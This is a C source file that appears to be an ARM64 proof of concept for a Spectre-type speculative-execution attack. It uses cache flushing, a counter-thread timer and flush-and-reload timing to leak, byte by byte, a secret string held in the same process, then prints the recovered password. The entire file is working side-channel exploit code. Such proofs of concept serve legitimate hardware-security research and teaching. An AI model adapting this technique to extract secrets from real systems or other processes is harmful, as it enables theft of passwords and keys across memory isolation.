#include <stdio.h>
#include <stdlib.h> 
#include <stdint.h>
#include <string.h>
#include <pthread.h>

#define LEN 16
#define MAX_TRIES 10000
#define CACHE_HIT_THRESHOLD 100


unsigned char** memory_slot_ptr[256];
unsigned char* memory_slot[256];

unsigned char secret_key[] = "PASSWORD_SPECTRE";
unsigned char public_key[] = "################";

uint8_t probe[256 * 4096];
uint64_t miss_min = 0;
volatile uint8_t tmp = 0;
volatile uint64_t counter = 0;


void victim_function(size_t idx) {
	unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
	*memory_slot_slow_ptr = public_key;
	tmp = probe[(*memory_slot)[idx] * 4096];
}

void *inc_counter(void *a) {
	while (1) {
		counter++;
		asm volatile ("DMB SY");
	}
}

static uint64_t timed_read(volatile uint8_t *addr) {
	uint64_t ns = counter;

	asm volatile (
		"DSB SY\n"
		"LDR X5, [%[ad]]\n"
		"DSB SY\n"
		: : [ad] "r" (addr) : "x5");

	return counter - ns;
}

static inline void flush(void *addr) {
	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
	asm volatile("DSB SY");
}

uint64_t measure_latency() {
	uint64_t ns;
	uint64_t min = 0xFFFFF;

	for (int r = 0; r < 300; r++) {
		flush(&probe[0]);
		ns = timed_read(&probe[0]);
		if (ns < min) min = ns;
	}

	return min;
}

void attacker_function() {
	char password[LEN + 1] = {'\0'};
	int mix_i;

	for (int idx = 0; idx < LEN; ++idx) {

		int results[256] = {0};
		// unsigned int junk = 0;

		for (int tries = 0; tries < MAX_TRIES; tries++) {

			*memory_slot_ptr = memory_slot;
			*memory_slot = secret_key;

			flush(memory_slot_ptr);
			for (int i = 0; i < 256; i++) {
				flush(&probe[i * 4096]);
			}

			asm volatile("DSB SY");

			victim_function(idx);

			for (int i = 0; i < 256; i++) {
				mix_i = ((i * 167) + 13) & 255;
				volatile uint8_t* addr = &probe[mix_i * 4096];
				uint64_t time = timed_read(&probe[mix_i * 4096]);

				if (time <= miss_min && mix_i != public_key[idx]) {
					results[mix_i]++; // cache hit
				}
			}
		}
		// tmp ^= junk; // use junk so code above won’t get optimized out

		int highest = -1;
		for (int i = 0; i < 256; i++) {
			if (highest < 0 || results[highest] < results[i]) {
				highest = i;
			}
		}
		printf("idx:%2d, highest:%c, hitrate:%f\n", idx, highest,
			(double)results[highest] * 100 / MAX_TRIES);
		password[idx] = highest;
	}
	printf("%s\n", password);
}


int main(void) {
	pthread_t inc_counter_thread;
	if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
		fprintf(stderr, "Error creating thread\n");
		return 1;
	}
    // let the bullets fly a bit ....
	while (counter < 10000000);
	asm volatile ("DSB SY");

	miss_min = measure_latency();
	if (miss_min == 0) {
		fprintf(stderr, "Unreliable access timing\n");
		exit(EXIT_FAILURE);
	}
	miss_min -= 1;
	printf("miss_min %d\n", miss_min);

	for (int i = 0; i < sizeof(probe); ++i) {
		probe[i] = 1; // write to array2 so in RAM not copy-on-write zero pages
	}
	attacker_function();
}
